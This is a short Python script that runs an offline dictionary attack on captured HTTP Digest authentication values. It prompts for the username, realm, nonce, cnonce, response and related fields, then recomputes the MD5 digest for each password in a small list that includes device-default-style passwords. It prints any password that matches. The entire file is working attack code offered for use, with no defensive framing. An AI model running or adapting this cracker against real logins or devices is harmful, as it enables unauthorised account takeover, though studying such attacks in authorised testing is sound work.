import sys
import json   
import argparse
import os
from hashlib import md5

# HA1 = MD5(username:realm:password)
# HA2 = MD5(method:digestURI)
# response = MD5(HA1:nonce:HA2)
# response = MD5(HA1:nonce:nonceCount:cnonce:qop:HA2)

def brute_force_attack(auth):

    passwords = ['123', 'user', 'password', 'axis123!', 'admin']

    ha2_str = auth['method'] + ':' + auth['uri']
    ha2 = md5(ha2_str.encode())

    for password in passwords:
        ha1_str = auth['username'] + ':' + auth['realm'] + ':' + password
        ha1 = md5(ha1_str.encode())
        resp = ha1.hexdigest() + ':' + auth['nonce'] + ':' + auth['nc'] + ':' + auth['cnonce'] + ':' + auth['qop'] + ':' + ha2.hexdigest()

        resp_hash = md5(resp.encode())
        
        if auth['response'] == resp_hash.hexdigest():
            print('Password cracked -> {}'.format(password))
            return

    print('Password not found in dictionary')



if __name__ == "__main__":

    auth = {}
    auth['username'] = input('Enter username: ')
    auth['realm'] = input('Enter realm: ')
    auth['nonce'] = input('Enter nonce: ')
    auth['uri'] = input('Enter uri: ')
    auth['response'] = input('Enter response: ')
    auth['nc'] = input('Enter nonce count (nc): ')
    auth['cnonce'] = input('Enter cnonce: ')
    auth['method'] = input('Enter HTTP method: ')
    auth['qop'] = 'auth'

    brute_force_attack(auth)

